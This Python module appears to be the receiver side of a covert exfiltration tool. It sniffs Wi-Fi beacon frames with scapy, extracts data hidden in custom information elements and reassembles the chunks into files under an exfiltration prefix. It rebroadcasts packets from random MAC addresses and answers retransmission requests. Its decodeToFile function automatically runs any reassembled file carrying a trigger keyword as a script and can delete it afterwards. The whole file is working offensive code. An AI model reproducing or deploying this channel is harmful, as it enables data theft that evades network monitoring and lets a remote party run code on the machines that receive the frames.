'''
@author JoinEngine
'''
import os
import platform
import subprocess
import collections
import time
import definitions
from definitions import vprint, basePacket, updateMemory,optimizedDelay
import sys
import binascii
import math
import logging
from datetime import datetime
import management
import string
from threading import Thread
import threading
from multiprocessing import Process, Manager, Pool
import random
from optparse import OptionParser
from copy import deepcopy
from time import sleep
import network

#supress the scapy IPv6 warning
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

#A dictionary of dictionaries to allow for some hardcore multithreading. i.e. see if a dictionary exists already with ID, if it does, then search it 
#inProgressDictionary={} 
#inProgressDictionary=manager.dict()
#lastCopy=manager.dict()
#problemList=manager.list()

#slower but helps with tracking already assembled items


#lastCopy={}
#problemList=[]

#used to remember the last few items

s=None

'''
'This returns a binary format from a hex format (really just a wrapper)
'@param hex the hex string to convert back to binary format
'''
def getHexAsBinary(hex):
	return (binascii.unhexlify(hex))

'''
'This takes a hex string and decodes it to an output file
'@param hexTring the hex string that should be restored to a file
'@param' outputName the name of the file that the decoded String should be written to
'''
def decodeToFile(hexString, outputName) :
	secondLine='cactus' #just a placeholder

	with open(outputName, 'a+b') as outputFile:
		binaryToRestore=getHexAsBinary(hexString)
		newFileByteArray = bytearray(binaryToRestore)
		outputFile.write(newFileByteArray)

	#I should do this in the above statement but it works
	with open(outputName, 'a+b') as outputFile:
		for i, line in enumerate(outputFile):
			if (i==1):
				secondLine=line.lower()

	#one time scripts use the execute keyword
	if (definitions.SCRIPT_KEYWORD in secondLine):
			management.launchScript(script=outputName, delete=True)
	elif (definitions.SCRIPT_ALTERNATE_KEYWORD in secondLine):
			management.launchScript(script=outputName, delete=False)

'''
'This is a filter designed to catch exfiltration packets and ignore non-relevant packets
'it might catch some legitimate packets as well, but that can be filtered at other points
'@param p the packet to filter and perform actions against'
'''
def packetFilter(p):
	#attempt at some quick early filtering if this isn't caught by the configuration file
	if (p.addr1 != definitions.BROADCAST_ID):
		return

	if p.addr2 not in definitions.macList: #TODO put the not back in, basically if you generated it, don't worry
		if p.haslayer(Dot11):
			if p.type==0 and p.subtype==8:
				if (p.haslayer(Dot11Elt)):
					if (p.getlayer(Dot11Elt).ID==definitions.DATA_ID):  #The first ELlt layer should always be the data layer for a properly constructed packet
						restoreDataToFile(p) #faster without actually threading
						#print ('hit target')
						#t=Thread(target=restoreDataToFile, args=(p))  #Start the procesing
						#t.daemon=True
						#t.start()
					elif (p.getlayer(Dot11Elt).ID==definitions.REPLAY_ID):
						retransmitStrip(p)
						#print ('missed target')

						#t=Thread(target=retransmitStrip, args=(p)) 
						#t.daemon=True
						#t.start()

'''
'Used to respond to a replay
'''
def retransmitStrip(pkt):
	#sleep(0.10) #minor sleep to help avoid conflict
	#change the broadcast address to something unique? Might actually improve performance but cost some anonymity
	
	seqNum=None
	identifier=None

	eltLayer = pkt.getlayer(Dot11Elt)

	while eltLayer:
		if (eltLayer.ID==definitions.REPLAY_ID):
			identifier=eltLayer.info
		elif (eltLayer.ID==definitions.SQNUM_ID):
			seqNum=eltLayer.info
		eltLayer = eltLayer.payload.getlayer(Dot11Elt) 

	

	if (seqNum and identifier):		
		target=definitions.inProgressDictionary.get(identifier)#RIGHT HERE target is none, so this fails, fetch it as you can
		if (target==None):
			target=definitions.memorySet.get(identifier)

		if (target):
			dataForRetransmit=target.get(int(seqNum))
			size=target.get(definitions.SIZE_KEY)
			if (dataForRetransmit):
				print ('responding to replay %s' % pkt.addr2)	
				toSend=basePacket(encodedData=dataForRetransmit, seqNum=seqNum, totalPieceCount=size, timeToLive=1, srcMAC=random.choice(definitions.macList), packetID=identifier, transmitName="partial")
				#sendp(toSend, iface=definitions.ifaceName, verbose=1)
				s.send(toSend)
				print ('replay sent')
				#toSend.show()
				#os._exit(0) #EXIT HERE BE SURE TO REMOVE
'''
;http://stackoverflow.com/questions/38987/how-to-merge-two-python-dictionaries-in-a-single-expression
'''
def merge_dicts(*dict_args):
    """
    Given any number of dicts, shallow copy and merge into a new dict,
    precedence goes to key value pairs in latter dicts.
    """
    result = {}
    for dictionary in dict_args:
        result.update(dictionary)
    return result

'''
'This takes in a packet that is likely to contain exfiltration data and then restores 
'it to a file on the system (if all pieces have been received)
'@param pkt the packet to process 
'''
def restoreDataToFile(pkt):
	#sleep(0.05) #seems to limit collisions
	receivedDataDictionary={}
	reconstructedData=""
	uniqueIdentifier=None
	coreData=None
	seqNum=None
	totalChunks=None
	timeLeft=None
	newItem=True
	itemName=repr(time.time()) #placeholder
	
	#extracts the relevant data from the elt layers of relevant packets
	eltLayer = pkt.getlayer(Dot11Elt)

	while eltLayer:
		if (eltLayer.ID==definitions.DATA_ID):
			coreData=eltLayer.info
		elif (eltLayer.ID==definitions.SQNUM_ID):
			seqNum=eltLayer.info
		elif (eltLayer.ID==definitions.TOTAL_PIECE_ID):
			totalChunks=eltLayer.info
		elif (eltLayer.ID==definitions.UNIQ_ID):
			uniqueIdentifier=eltLayer.info
		elif (eltLayer.ID==definitions.NAME_ID):
			itemName=eltLayer.info
		elif (eltLayer.ID==definitions.TTL_ID):
			timeLeft=int(eltLayer.info)
			eltLayer.info=str(timeLeft-1) #here's where I decrease the TTL, because I will forget again...and again
		eltLayer = eltLayer.payload.getlayer(Dot11Elt)

	#ensure that this file has not already been assembled
	if (uniqueIdentifier in definitions.alreadyAssembledList):
		newItem=False
	
	#only take action if all the required components are present
	if (coreData and seqNum and totalChunks and uniqueIdentifier and timeLeft and newItem):	

		if uniqueIdentifier in definitions.inProgressDictionary:
			receivedDataDictionary=definitions.inProgressDictionary[uniqueIdentifier].copy()	

		receivedDataDictionary[int(seqNum)]=coreData
		receivedDataDictionary[definitions.SIZE_KEY]=int(totalChunks) #adding something to account for size

		#TODO optimize this with opening a socket in advance, make sure to then close said socket
		if (timeLeft>0):  #set the source IP to a blacklisted one and rebroadcast
				pkt.addr2=random.choice(definitions.macList)
				#sendp(pkt, iface=definitions.ifaceName, verbose=0)
				s.send(pkt)

		#stich the constructed data back together and write it to disk
		if (len(receivedDataDictionary) >=(int(totalChunks)+1)): #adding +1 to account for size tracking
			updateMemory(reconstructedData=receivedDataDictionary, uniqueIdentifier=uniqueIdentifier) #TODO
			definitions.inProgressDictionary.pop(uniqueIdentifier, None) #must call early to avoid shallow copy errors and an extra duplication
			definitions.alreadyAssembledList.append(uniqueIdentifier) 

			print ("got a complete transmission")
			for i in xrange (1, len(receivedDataDictionary)): #subtracting 1 to account for size variable

				reconstructedData=reconstructedData+receivedDataDictionary.get(i);
		
			exFileName=definitions.EXFIL_BASE
			exFileName+=repr(time.time())[:-definitions.NAME_IDENTIFIER_LENGTH]+"_"
			exFileName+=itemName

			if (definitions.writeToDisk):
				print ('Assembling file')
				decodeToFile(reconstructedData, exFileName)
			else:
				print ('File stored to memory but not written')				
		else:
			definitions.inProgressDictionary[uniqueIdentifier]=receivedDataDictionary #TODO write to memory like this

			if (definitions.verbose): #possibly slightly faster to do this check first if verbose=false
				if (len(receivedDataDictionary)%definitions.PERCENT_COUNT_INTERVAL==0):
					vprint('receiving', uniqueIdentifier, ":", '{0:.1f}%'.format((float(len(receivedDataDictionary)/float(totalChunks))*100)))


'''
'This engages the sniff feature of scapy. It uses a packet processing filter
'to handle key packets needed for engagement
'''
def sniffForData():
	global s

	s = conf.L2socket(iface=definitions.ifaceName)

	print ('starting receiver node')
	
	try:
		conf.sniff_promisc = 0
		sniff(iface=definitions.ifaceName, prn=packetFilter)
	finally:
		s.close()


